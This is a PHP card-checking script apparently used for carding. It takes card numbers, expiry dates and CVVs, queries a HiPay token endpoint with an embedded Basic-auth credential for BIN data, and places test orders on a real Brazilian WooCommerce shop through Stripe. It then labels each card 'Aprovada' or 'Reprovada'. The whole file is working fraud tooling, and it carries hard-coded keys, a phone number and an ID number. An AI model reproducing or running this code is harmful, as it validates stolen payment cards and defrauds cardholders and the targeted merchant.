<?php

// Api By Haika#1337

error_reporting(0);
set_time_limit(0);

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

$haika = $_GET["lista"];

$explode = explode("|", $haika);

$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];

if($cc == NULL OR $mes == NULL OR $ano == NULL OR $cvv == NULL){
    die("Cartão Invalido");
}

if(file_exists("haikafree.txt")){
    unlink("haikafree.txt");
}

$cookie = getcwd()."/haikafree.txt";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://secure2-vault.hipay-tpp.com/rest/v2/token/create.json");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Basic OTQ2NzkxMTguc2VjdXJlLWdhdGV3YXkuaGlwYXktdHBwLmNvbTpMaXZlX2ZLd2x1Rk9uZmpRQTVjdWZrdFlZUXRTbQ==',
'Content-Type: application/x-www-form-urlencoded',
'Host: secure2-vault.hipay-tpp.com',
'Origin: https://secure-gateway.hipay-tpp.com',
'Referer: https://secure-gateway.hipay-tpp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card_number='.$cc.'&card_holder=Ivo+kisner+junior&card_expiry_month=12&card_expiry_year=2024&cvc=000&generate_request_id=0&multi_use=1');
$bins = curl_exec($ch);
$hal = strtolower($bins);
$json = json_decode($hal, true);
$token = $json["token"];
$banco = $json["issuer"];
$pais = $json["country"];
$tipo = $json["card_type"];
$nivel = $json["card_category"];
$bandeira = $json["brand"];
$INFO = "$bandeira $banco $tipo $nivel ($pais)";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ensinadoresdejustica.com.br/produto/substituindo-os-bois-pelos-trabalhadores/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryauF0S0EfVS0yQzkY',
'origin: https://ensinadoresdejustica.com.br',
'referer: https://ensinadoresdejustica.com.br/produto/substituindo-os-bois-pelos-trabalhadores/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryauF0S0EfVS0yQzkY
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundaryauF0S0EfVS0yQzkY
Content-Disposition: form-data; name="add-to-cart"

5327
------WebKitFormBoundaryauF0S0EfVS0yQzkY--');
$addcard = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ensinadoresdejustica.com.br/checkout-loja/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'referer: https://ensinadoresdejustica.com.br/carrinho/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0'));
$finalizar = curl_exec($ch);

$nonce = getStr($finalizar, 'name="woocommerce-process-checkout-nonce" value="','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=asdasd+asdasd&owner[address][line1]=asdasdas+dasd&owner[address][line2]=adasdass&owner[address][state]=MG&owner[address][city]=Tr%C3%AAs+Pontas&owner[address][postal_code]=37190-000&owner[address][country]=BR&owner[email]=haikaboost%40gmail.com&owner[phone]=(19)+99458-4593&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e46940e7-e850-43a1-afca-492ccad2fbdf71c315&muid=331939c2-3c51-4391-bd94-9539a413ae5778f8c2&sid=da04a830-3167-481f-80c0-09469ddbd1d51cb6a8&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2Ff5dde66da2%3B+stripe-js-v3%2Ff5dde66da2&time_on_page=193718&key=pk_test_51LIaOYFlF4NK3XLuGKCsHXxe4Qjnt1U1DlKJ9vN1mEfzB4PlllUhK9K9uAbhDNjIFnWmnW3aJxYLZ7erN2sMa61z00dkPBftkM');
$stripe = curl_exec($ch);

$id = getStr($stripe, '"id": "','",');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ensinadoresdejustica.com.br/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://ensinadoresdejustica.com.br',
'referer: https://ensinadoresdejustica.com.br/checkout-loja/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=asdasd&billing_last_name=asdasd&billing_cpf=516.947.306-03&billing_rg=516.947.306-03&billing_birthdate=10%2F03%2F1971&billing_sex=Feminino&billing_country=BR&billing_postcode=37190-000&billing_address_1=asdasdas+dasd&billing_number=123&billing_address_2=adasdass&billing_neighborhood=&billing_city=Tr%C3%AAs+Pontas&billing_state=MG&billing_phone=(19)+99458-4593&billing_cellphone=&billing_email=apibyhaika'.rand(10,100000000).'%40gmail.com&account_password=Suasenha123!&order_comments=&payment_method=stripe&stripe_boleto_tax_id=&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id.'');
$wcajax = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ensinadoresdejustica.com.br/checkout-loja/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0'));
$finalizar = curl_exec($ch);

$retorno = getStr($finalizar, '<span>Erro.</span>','</li>');
$retorno2 = getStr($wcajax, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n            <i class=\"fa fa-times\"><\/i>\n            <span>Erro.<\/span>\n','<\/li>\n\t<\/ul>\n",');

if(strpos($wcajax, '"redirect":"https')){
    die("<span class='badge badge-success' style='color:white;'>💚 #Aprovada</span> [$cc $mes/$ano $cvv] » $INFO » <span class='badge badge-primary' style='color:white;'>[TRANSAÇÃO AUTORIZADA]</span> HaikaSC <br>");
}
else{
    die("<span class='badge badge-danger' style='color:white;'>💔 #Reprovada</span> [$cc $mes/$ano $cvv] » $INFO » <span class='badge badge-primary' style='color:white;'>[$retorno$retorno2]</span> » HaikaSC <br>");
}

?>
